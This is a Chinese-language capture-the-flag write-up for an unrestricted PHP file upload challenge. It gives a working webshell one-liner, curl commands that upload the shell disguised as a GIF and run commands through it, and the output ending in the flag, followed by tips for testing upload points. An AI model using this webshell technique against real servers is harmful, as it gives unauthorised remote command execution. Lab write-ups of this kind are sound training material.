## 题解

### 入口与指纹

`Apache/2.4.38 (Debian)` + **`X-Powered-By: PHP/7.1.33`**，标题 `Image Upload`。

```html
<form action="index.php" method="post" enctype="multipart/form-data">
  <input type="file" name="userfile" id="userfile">
  <input type="submit" value="Upload Image" name="submit">
</form>
```

PHP 7.1 + 老 Apache，且是「图片上传」——先想上传点。

### 关键观察

**1. 上传没有任何校验（扩展名、MIME、内容都不查）。**

```bash
printf '<?php echo "PWN41b"; system($_GET[0]); ?>' > s41.php
curl -F 'userfile=@s41.php;filename=s41.php;type=image/gif' \
     -F 'submit=Upload+Image' http://$T/index.php
```

响应：

```text
File is valid, and was successfully uploaded here.
```

（"here" 是页面里一个链接，指向落点目录。）

**2. 落点是 `/upload/`，而且该目录会执行 PHP。**

```bash
curl http://$T/upload/s41.php?0=id
# PWN41buid=33(www-data)
```

试过的几个候选：`/uploads/`、`/images/`、`/files/` 全 404，只有 `/upload/` 命中。
**目录名是单数**——这点必须实测，不能凭习惯猜。

### 利用链

```bash
T=$(head -1 .target)

printf '<?php echo "PWN:"; system($_GET[0]); ?>' > s.php
curl -sS -F 'userfile=@s.php;filename=s.php;type=image/gif' \
     -F 'submit=Upload+Image' "http://$T/index.php"

# 落点是 /upload/<filename>
curl -sS --get --data-urlencode '0=id; ls /; cat /flag.txt' "http://$T/upload/s.php"
```

```text
PWN:uid=33(www-data) gid=33(www-data)
…
flag{13be7dd9-284f-4387-a052-9b6a1675f874}
```

容器根目录里还有一个 `flag-entrypoint.sh`：

```sh
#!/bin/sh
export FLAG="$(cat /flag.txt)"
exec "$@"
```

——它把 `/flag.txt` 读进环境变量，说明 flag 就是 `/flag.txt` 本身。

### flag 位置

容器根目录的 **`/flag.txt`**（小写，与 `/FLAG.txt` 那批不同）。

## 复盘

- **上传点先测「能不能传 PHP 并执行」，别急着做图片马。** 这里扩展名和 MIME 都没校验，
  直接传 `.php` 就成；先做 GIF 头那段（`GIF89a;<?php …`）是多余的。
- **落点必须实测，不能猜。** `/uploads/`、`/images/`、`/files/` 都 404，
  只有 `/upload/` 命中。判据是上传响应里的链接文本（"uploaded here"），
  点开那个相对链接才知道目录名。
- **落点目录是否解析 PHP 决定成败。** 有些题上传目录被禁止执行，需要 `.htaccess`
  或路径穿越把文件挪走；本题 `/upload/` 直接解析，一步到位。
- **拿到 webshell 先 `ls /`。** 这题 flag 是 `/flag.txt`（小写），
  同时还有 `flag-entrypoint.sh` 解释它的来源；两者都值得看一眼。
- **PHP 7.1 + Apache 2.4.38 是老组合**，提示可能存在其它已知问题，
  但本题上传点已经足够，不需要再往下挖。
